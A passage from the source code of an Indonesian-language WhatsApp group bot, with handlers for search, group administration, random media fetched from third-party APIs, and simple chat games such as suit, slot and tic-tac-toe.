				  if (q.includes('--')) {
					if (data.result.length < jumlah) {
					  jumlah = data.result.length
					  reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
					}
					for (let i = 0; i < jumlah; i++) {
					  xnone.sendMessage(from, { image: { url: data.result[i] }})
					}
				    limitAdd(sender, limit)
				  } else {
					var but = [ { quickReplyButton: { displayText: `Next Photo️️`, id: `${prefix}pinterest ${q}` } } ]
					xnone.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya', templateButtons: but }, { quoted: msg })
				    limitAdd(sender, limit)
				  }
				})
			    break
			case prefix+'yts': case prefix+'ytsearch':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    if (args.length < 2) return reply(`Kirim perintah ${command} query`)
				reply(mess.wait)
			    yts(q).then( data => {
				  let yt = data.videos
				  var jumlah = 15
				  if (yt.length < jumlah) jumlah = yt.length
				  var no = 0
				  let txt = `*「 YOUTUBE SEARCH 」*

*Data berhasil didapatkan*
*Hasil pencarian dari ${q}*
 
*${prefix}getmusic <no urutan>*
*${prefix}getvideo <no urutan>*
 Untuk mengambil Audio/Video dari hasil pencarian`
                for (let i = 0; i < jumlah; i++) {
				  no += 1
				  txt += `\n─────────────────\n\n*No Urutan : ${no.toString()}*\n*▢ Judul :* ${yt[i].title}\n*▢ ID :* ${yt[i].videoId}\n*▢ Channel :* ${yt[i].author.name}\n*▢ Upload :* ${yt[i].ago}\n*▢ Ditonton :* ${yt[i].views}\n*▢ Duration :* ${yt[i].timestamp}\n*▢ URL :* ${yt[i].url}\n`
				}
				xnone.sendMessage(from, { image: { url: yt[0].image }, caption: txt }, { quoted: msg })
				limitAdd(sender, limit)
				}).catch(() => reply(mess.error.api))
			    break
            case prefix+'wiki': case prefix+'wikipedia':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah ${command} Kata\nContoh : ${command} WhatsApp`)
                reply(mess.wait)
                var data = await fetchJson(`https://hadi-api.herokuapp.com/api/wiki?query=${q}`)
                var captionnya = `${data.result}\n\n${readmore}`
                xnone.sendMessage(from, {caption: captionnya, image: {url: `https://telegra.ph/file/b4a72e6438af9770300eb.jpg`}, templateButtons: buttonsWiki, footer: footxt, mentions: [sender] })
                limitAdd(sender, limit)
                break
                
            // Group Menu
            case prefix+'antilink':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isAntiLink) return reply(`Udah aktif`)
                    antilink.push(from)
                    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                    reply('Sukses mengaktifkan antilink di grup ini')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = antilink.indexOf(from)
                    antilink.splice(anu, 1)
                    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                    reply('Sukses menonaktifkan antilink di grup ini')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'antiwame':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isAntiWame) return reply(`Udah aktif`)
                    antiwame.push(from)
                    fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                    reply('Sukses mengaktifkan antiwame di grup ini')
                } else if (args[1].toLowerCase() === 'disable'){
                    let anu = antiwame.indexOf(from)
                    antiwame.splice(anu, 1)
                    fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                    reply('Sukses menonaktifkan antiwame di grup ini')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'welcome':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === "enable") {
                    if (isWelcome) return reply(`Udah aktif`)
                    welcome.push(from)
                    fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                    reply('Sukses mengaktifkan welcome di grup ini')
                } else if (args[1].toLowerCase() === "disable") {
                    var posi = welcome.indexOf(from)
                    welcome.splice(posi, 1)
                    fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                    reply('Sukses menonaktifkan welcome di grup ini')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'left':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (args.length === 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === "enable") {
                    if (isLeft) return reply(`Udah aktif`)
                    left.push(from)
                    fs.writeFileSync('./database/left.json', JSON.stringify(left, null, 2))
                    reply('Sukses mengaktifkan left di grup ini')
                } else if (args[1].toLowerCase() === "disable") {
                    var posi = left.indexOf(from)
                    left.splice(posi, 1)
                    fs.writeFileSync('./database/left.json', JSON.stringify(left, null, 2))
                    reply('Sukses menonaktifkan left di grup ini')
                } else {
                    reply(`Pilih enable atau disable`)
                }
                break
            case prefix+'setwelcome':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(from, set_welcome_db)) return reply(`Set welcome already active`)
            addSetWelcome(q, from, set_welcome_db)
            reply(`Successfully set welcome!`)
            break
        case prefix+'changewelcome':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
            if (isSetWelcome(from, set_welcome_db)) {
                changeSetWelcome(q, from, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            } else {
                addSetWelcome(q, from, set_welcome_db)
                reply(`Sukses change set welcome teks!`)
            }
            break
        case prefix+'delsetwelcome':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isSetWelcome(from, set_welcome_db)) return reply(`Belum ada set welcome di sini..`)
            removeSetWelcome(from, set_welcome_db)
            reply(`Sukses delete set welcome`)
            break
        case prefix+'setleft':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Halo @user, Selamat tinggal dari @group`)
            if (isSetLeft(from, set_left_db)) return reply(`Set left already active`)
            addSetLeft(q, from, set_left_db)
            reply(`Successfully set left!`)
            break
        case prefix+'changeleft':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Halo @user, Selamat tinggal dari @group`)
            if (isSetLeft(from, set_left_db)) {
                changeSetLeft(q, from, set_left_db)
                reply(`Sukses change set left teks!`)
            } else {
                addSetLeft(q, from, set_left_db)
                reply(`Sukses change set left teks!`)
            }
            break
        case prefix+'delsetleft':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isSetLeft(from, set_left_db)) return reply(`Belum ada set left di sini..`)
            removeSetLeft(from, set_left_db)
            reply(`Sukses delete set left`)
            break
            case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				var url = await xnone.groupInviteCode(from).catch(() => reply(mess.error.api))
			    url = 'https://chat.whatsapp.com/'+url
				reply(url)
				break
			case prefix+'setppgrup': case prefix+'setppgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (isImage || isQuotedImage) {
				  var media = await downloadAndSaveMediaMessage('image', `ppgc${from}.jpeg`)
			      await xnone.updateProfilePicture(from, { url: media })
				  .then( res => {
					reply(`Success`)
					fs.unlinkSync(media)
				  }).catch(() => reply(mess.error.api))
				} else {
			      reply(`Kirim/balas gambar dengan caption ${command}`)
				}
				break
			case prefix+'setnamegrup': case prefix+'setnamegc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await xnone.groupUpdateSubject(from, q)
			    .then( res => {
				  reply(`Success`)
				}).catch(() => reply(mess.error.api))
			    break
			case prefix+'setdesc': case prefix+'setdescription':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await xnone.groupUpdateDescription(from, q)
			    .then( res => {
			      reply(`Success`)
				}).catch(() => reply(mess.error.api))
				break
			case prefix+'group': case prefix+'grup':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				if (args[1] == "close") {
				  xnone.groupSettingUpdate(from, 'announcement')
				  reply(`Success mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
				} else if (args[1] == "open") {
				  xnone.groupSettingUpdate(from, 'not_announcement')
				  reply(`Success mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
				} else {
				  reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				}
			    break
			case prefix+'revoke':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				await xnone.groupRevokeInvite(from)
			    .then( res => {
				  reply(`Success menyetel tautan undangan grup ini`)
				}).catch(() => reply(mess.error.api))
				break
			case prefix+'hidetag': case prefix+'ht':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
			    let mem = [];
		        groupMembers.map( i => mem.push(i.id) )
				xnone.sendMessage(from, { text: q ? q : '', mentions: mem })
			    break
            case prefix+'add':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                var number;
                if (args[1]) {
                    number = mentioned[0]
                    var cek = await xnone.onWhatsApp(number)
                    if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
                    xnone.groupParticipantsUpdate(from, [number], "add")
                   .then( res => reply(jsonformat(res)))
                   .catch( err => reply(jsonformat(err)))
               } else if (isQuotedMsg) {
                   number = quotedMsg.sender
                   var cek = await xnone.onWhatsApp(number)
                   if (cek.length == 0) return reply(`Member yang kamu balas pesannya sudah tidak terdaftar di WhatsApp`)
                   xnone.groupParticipantsUpdate(from, [number], "add")
                   .then( res => reply(jsonformat(res)))
                   .catch( err => reply(jsonformat(err)))
                } else {
                    reply(`Kirim perintah ${command} nomer atau balas pesan orang yang ingin dimasukkan kedalam grup`)
                }
                break
            case prefix+'kick':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                var number;
                if (mentioned.length !== 0) {
                    number = mentioned[0]
                    xnone.groupParticipantsUpdate(from, [number], "remove")
                    .then( res => reply(jsonformat(res)))
                    .catch( err => reply(jsonformat(err)))
                } else if (isQuotedMsg) {
                    number = quotedMsg.sender
                    xnone.groupParticipantsUpdate(from, [number], "remove")
                    .then( res => reply(jsonformat(res)))
                    .catch( err => reply(jsonformat(err)))
                } else {
                    reply(`Tag atau balas pesan member yang ingin dikeluarkan dari grup`)
                }
                break
            case prefix+'promote': case prefix+'pm':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (mentioned.length > 1) return reply('Tagnya satu aja kaka')
                if (mentioned.length !== 0){
                    xnone.groupParticipantsUpdate(from, mentioned, "promote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)
                    xnone.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (!isNaN(args[1])) {
                    xnone.groupParticipantsUpdate(from, [args[1] + '@s.whatsapp.net'], "promote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else {
                    reply(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di promote`)
                }
                break
            case prefix+'demote': case prefix+'dm':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (mentioned.length > 1) return reply('Tagnya satu aja kaka')
                if (mentioned.length !== 0){
                    xnone.groupParticipantsUpdate(from, mentioned, "demote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa kick Owner`)
                    xnone.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else if (!isNaN(args[1])) {
                    xnone.groupParticipantsUpdate(from, [args[1] + '@s.whatsapp.net'], "demote")
                    .then((res) => reply(jsonformat(res)))
                    .catch((err) => reply(jsonformat(err)))
                } else {
                    reply(`Kirim perintah ${prefix}demote @tag atau nomor atau reply pesan orang yang ingin di demote`)
                }
                break

        // Random Menu
        case prefix+'asupan': {
            if (!fromMe) return reply(`Fitur sudah di lock karena bulan ramadhan, kami akan buka kembali setelah ramadhan. Terima kasih.`)
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            axios.get(`https://api.lolhuman.xyz/api/asupan?apikey=${apikeys}`)
                .then(({ data }) => {
                    xnone.sendMessage(from, { video: { url: data.result }, caption: 'Asupan Neh' }, { quoted: msg })
                        .catch((err) => {
                            sendMess(ownerNumber, 'Asupan : ' + err)
                            console.log(color('[ ASUPAN ]', 'red'), err)
                            reply(mess.error.api)
                        })
                        limitAdd(sender, limit)
                })
            }
            break
        case prefix+'couple': case prefix+'kapel': case prefix+'ppcp': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            let anu = await axios.get(`https://zenzapis.xyz/api/random/couples?apikey=hdiiofficial`)
            xnone.sendMessage(from, { image: { url: anu.data.result.male }, caption: 'Cowo' }, { quoted: msg } )
                .then((res) => xnone.sendMessage(from, { image: { url: anu.data.result.female }, caption: 'Cewe' }, { quoted: res }))
                .catch((err) => {
                    reply(mess.error.api)
                })
                limitAdd(sender, limit)
            }
            break
        case prefix+'meme': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            xnone.sendMessage(from, { image: { url: 'https://zenzapis.xyz/api/random/memeindo?apikey=hdiiofficial' }, caption: '*Random Meme*' }, { quoted: msg } )
                .catch((err) => {
                    sendMess(ownerNumber, 'Meme : ' + err)
                    console.log(color('[ MEME ]', 'red'), err)
                    reply(mess.error.api)
                })
            limitAdd(sender, limit)
            }
            break
        case prefix+'waifu': case prefix+'wibu': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            xnone.sendMessage(from, { image: { url: 'https://zenzapis.xyz/api/random/waifu?apikey=hdiiofficial' }, caption: '*Cintai waifu mu >\\<*' }, { quoted: msg } )
                .catch((err) => {
                    sendMess(ownerNumber, 'Waifu : ' + err)
                    console.log(color('[ WAIFU ]', 'red'), err)
                    reply(mess.error.api)
                })
            limitAdd(sender, limit)
            }
            break
        case prefix+'gachacowok': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            xnone.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/cogan?apikey=${apikeys}` }, caption: 'Cogan Nih Bos:v' }, { quoted: msg } )
                .catch((err) => {
                    sendMess(ownerNumber, 'Gacha Cowok : ' + err)
                    console.log(color('[ GACHA ]', 'red'), err)
                    reply(mess.error.api)
                })
            limitAdd(sender, limit)
            }
            break
        case prefix+'gachacewek': {
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            xnone.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/cecan?apikey=${apikeys}` }, caption: 'Cecan Nih Bos:v' }, { quoted: msg } )
                .catch((err) => {
                    sendMess(ownerNumber, 'Gacha Cewek : ' + err)
                    console.log(color('[ GACHA ]', 'red'), err)
                    reply(mess.error.api)
                })
            limitAdd(sender, limit)
            }
            break
        case prefix+'quotes':{
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            var data = fs.readFileSync("./lib/quote.json");
            var jsonData = JSON.parse(data);
            var randIndex = Math.floor(Math.random() * jsonData.length);
            var randKey = jsonData[randIndex];
            var randQuote = '' + randKey.quote + '\n\n_By: ' + randKey.by + '_'
            var hehe = [
            { quickReplyButton: { displayText: `Get Again`, id: `${prefix}quotes` } }
            ]
            xnone.sendMessage(from, { text: randQuote, footer: footxt, templateButtons: hehe })
            limitAdd(sender, limit)
            }
            break
        case prefix+'bucin': case prefix+'pantun': case prefix+'katabijak': case prefix+'faktaunik':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            axios.get(`https://api.lolhuman.xyz/api/random/${command.slice(1)}?apikey=${apikeys}`)
                .then(({ data }) => {
                    var huhu = [
                        { quickReplyButton: { displayText: `Get Again`, id: `${command}` } }
                    ]
                    xnone.sendMessage(from, { text: data.result, footer: footxt, templateButtons: huhu })
                    limitAdd(sender, limit)
                })
            break
        case prefix+'darkjoke': case prefix+'darkjokes':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            reply(mess.wait)
            var dark = [
            { quickReplyButton: { displayText: `Get Again`, id: `${prefix}darkjoke` } }
            ]
            xnone.sendMessage(from, { caption: 'Gelap?', image: { url: 'https://zenzapis.xyz/api/random/darkjoke?apikey=hdiiofficial' }, templateButtons: dark, footer: footxt })
            limitAdd(sender, limit)
            break

            // Fun Menu
            case prefix+'suit':
                var sutit = `Pilih Button Dibawah Untuk Bermain`
                var but = [
                { quickReplyButton: { displayText: `Batu ✊`, id: `${prefix}sbatu` } },
                { quickReplyButton: { displayText: `Kertas 🖐️`, id: `${prefix}skertas` } },
                { quickReplyButton: { displayText: `Gunting ✌️`, id: `${prefix}sgunting` } }
                ]
                xnone.sendMessage(from, { text: sutit, footer: footxt, templateButtons: but })
                break
            case prefix+'sbatu':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                const batu = [`Aku Memilih *Batu*\nKamu Memilih *Batu*\n\n!! KITA SERI !!`,`Aku Memilih *Gunting*\nKamu Memilih *Batu*\n\n!! KAMU MENANG:( !!`,`Aku Memilih *Kertas*\nKamu Memilih *Batu*\n\n!! AKU MENANG !!`]
                const batuh = batu[Math.floor(Math.random() * batu.length)]
                var batuh2 = `*[ GAME SUIT ]*\n\n${batuh}`
                xnone.sendMessage(from, { text: batuh2 }, { quoted: msg })
                gameAdd(sender, glimit)
                break
            case prefix+'skertas':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                const kertas = [`Aku Memilih *Batu*\nKamu Memilih *Kertas*\n\n!! KAMU MENANG :( !!`,`Aku Memilih *Gunting*\nKamu Memilih *Kertas*\n\n!! KAMU KALAH !!`,`Aku Memilih *Kertas*\nKamu Memilih *Kertas*\n\n!! KITA SERI !!`]
                const kertash = kertas[Math.floor(Math.random() * kertas.length)]
                var kertash2 = `*[ GAME SUIT ]*\n\n${kertash}`
                xnone.sendMessage(from, { text: kertash2 }, { quoted: msg })
                gameAdd(sender, glimit)
                break
            case prefix+'sgunting':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                const gunting = [`Aku Memilih *Batu*\nKamu Memilih *Gunting*\n\n!! AKU MENANG !!`,`Aku Memilih *Gunting*\nKamu Memilih *Gunting*\n\n!! KITA SERI !!`,`Aku Memilih *Kertas*\nKamu Memilih *Gunting*\n\n!! KAMU MENANG :( !!`]
                const guntingh = gunting[Math.floor(Math.random() * gunting.length)]
                var guntingh2 = `*[ GAME SUIT ]*\n\n${guntingh}`
                xnone.sendMessage(from, { text: guntingh2 }, { quoted: msg })
                gameAdd(sender, glimit)
                break
            case prefix+'slot':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                const pepekk = [
                '🍊 : 🍒 : 🍐',
                '🍒 : 🔔 : 🍊',
                '🍇 : 🍇 : 🍐',
                '🍊 : 🍋 : 🔔', // ANKER
                '🔔 : 🍒 : 🍐',
                '🔔 : 🍒 : 🍊',
                '🍊 : 🍋 : 🔔',        
                '🍐 : 🍒 : 🍋',
                '🍐 : 🍒 : 🍐',
                '🍊 : 🍒 : 🍒',
                '🔔 : 🔔 : 🍇',
                '🍌 : 🍌 : 🔔',
                '🥑 : 🥑 : 🥑 Win👑',
                '🍐 : 🔔 : 🔔',
                '🍊 : 🍋 : 🍒',
                '🌶️ : 🌶️ : 🌶️ Win👑',
                '🍋 : 🍋 : 🍋 Win👑',
                '🔔 : 🔔 : 🍇',
                '🔔 : 🍇 : 🍇', 
                '🔔 : 🍐 : 🔔',
                '🍌 : 🍌 : 🍌 Win👑'
                ]
                const kalah = [
                '🍊 : 🍒 : 🍐',
                '🍒 : 🔔 : 🍊',
                '🍇 : 🍇 : 🍐',
                '🍊 : 🍋 : 🔔', // ANKER
                '🔔 : 🍒 : 🍐',
                '🔔 : 🍒 : 🍊',
                '🍊 : 🍋 : 🔔',        
                '🍐 : 🍒 : 🍋',
                '🍐 : 🍒 : 🍐',
                '🍊 : 🍒 : 🍒',
                '🔔 : 🔔 : 🍇',
                '🍌 : 🍌 : 🔔',
                '🍐 : 🔔 : 🔔',
                '🍊 : 🍋 : 🍒',
                '🔔 : 🔔 : 🍇',
                '🔔 : 🍇 : 🍇', 
                '🔔 : 🍐 : 🔔',
                ]
                const kalah2 = [
                '🍊 : 🍒 : 🍐',
                '🍒 : 🔔 : 🍊',
                '🍇 : 🍇 : 🍐',
                '🍊 : 🍋 : 🔔', // ANKER
                '🔔 : 🍒 : 🍐',
                '🔔 : 🍒 : 🍊',
                '🍊 : 🍋 : 🔔',        
                '🍐 : 🍒 : 🍋',
                '🍐 : 🍒 : 🍐',
                '🍊 : 🍒 : 🍒',
                '🔔 : 🔔 : 🍇',
                '🍌 : 🍌 : 🔔',
                '🍐 : 🔔 : 🔔',
                '🍊 : 🍋 : 🍒',
                '🔔 : 🔔 : 🍇',
                '🔔 : 🍇 : 🍇', 
                '🔔 : 🍐 : 🔔',
                ]
                const selot = pepekk[Math.floor(Math.random() * pepekk.length)]
                const kalahnya = kalah[Math.floor(Math.random() * kalah.length)]
                const kalahnya2 = kalah2[Math.floor(Math.random() * kalah2.length)]
                var slotnya = `*[ 🎰 GAME SLOT 🎰 ]*

${kalahnya}
${selot}
${kalahnya2}

Note : Jika Kamu Mendapatkan Item Yang Sama, Kamu Menang!!!
Contoh : 🔔 : 🔔 : 🔔`
                var but = [ { quickReplyButton: { displayText: `🕹 Play Again 🕹️️`, id: `${prefix}slot` } } ]
                xnone.sendMessage(from, { text: slotnya, footer: footxt, templateButtons: but })
                gameAdd(sender, glimit)
                break
            case prefix+'tictactoe': case prefix+'ttt': case prefix+'ttc':
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (!isGroup)return reply(mess.OnlyGrup)
                if (isTicTacToe(from, tictactoe)) return reply(`Masih ada game yg blum selesai`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentionByTag.length !== 1) {
                if (mentionByTag[0] === botNumber) return reply(`Tidak bisa bermain dengan bot!`)
                if (mentionByTag[0] === sender) return reply(`Sad amat main ama diri sendiri`)
                    var hadiah = randomNomor(100, 150)
				    mentions((`@${sender.split('@')[0]} menantang @${mentionByTag[0].split('@')[0]} untuk bermain TicTacToe\n\nKirim (Y/N) untuk bermain\n\nHadiah : ${hadiah} balance`), [sender, mentionByTag[0]], false)
                    tictactoe.push({
                        id: from,
                        status: null,
                        hadiah: hadiah,
                        penantang: sender,
                        ditantang: mentionByTag[0],
                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                    })
                    gameAdd(sender, glimit)
                } else {
                    reply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
			case prefix+'delttt': case prefix+'delttc':
                if (!isGroup)return reply(mess.OnlyGrup)
                if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (!isTicTacToe(from, tictactoe)) return reply(`Tidak ada sesi game tictactoe di grup ini`)
                var posi = getPosTic(from, tictactoe)
                if (tictactoe[posi].penantang.includes(sender)) {
                    tictactoe.splice(posi, 1)
                    reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                } else if (tictactoe[posi].ditantang.includes(sender)) {
                    tictactoe.splice(posi, 1)
                    reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                } else if (isGroupAdmins) {
                    tictactoe.splice(posi, 1)
                    reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                } else if (isOwner) {
                    tictactoe.splice(posi, 1)
                    reply(`Berhasil menghapus sesi tictactoe di grup ini`)
                } else {
                    reply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
                }
                break
            case prefix+'tebakgambar':
		        if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
			    if (isPlayGame(from, tebakgambar)) return xnone.reply(from, `Masih ada game yang belum diselesaikan`, tebakgambar[getGamePosi(from, tebakgambar)].msg)
                kotz.tebakgambar().then( data => {
                data = data[0]
                data.jawaban = data.jawaban.split('Jawaban ').join('')
                var teks = `*「 TEBAK GAMBAR 」*\n\n`+monospace(`Petunjuk : ${data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                xnone.sendMessage(from, { image: { url: data.image }, caption: teks }, { quoted: msg })
                .then( res => {
                    var jawab = data.jawaban.toLowerCase()
                    addPlayGame(from, 'Tebak Gambar', jawab, gamewaktu, res, tebakgambar)
                    gameAdd(sender, glimit)
                    })
                })
                break
            case prefix+'apakah':
                if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} kamu lonteh`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul','Bisa Jadi Tidak']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                xnone.sendMessage(from, { text: `Pertanyaan : apakah ${q}\nJawaban : ${kah}` }, { quoted: msg })
                break
            case prefix+'bisakah': case prefix+'bisa': case prefix+'bisagak':
                if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya punya cewe`)
                const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Awokwokak','TENTU PASTI KAMU BISA!!!!','TENTU, PASTI KAMU *TIDAK* BISA!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                xnone.sendMessage(from, { text: `Pertanyaan : bisakah ${q}\nJawaban : ${ga}` }, { quoted: msg })
                break
            case prefix+'kapankah': case prefix+'kapan':
                if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} saya punya cewe`)
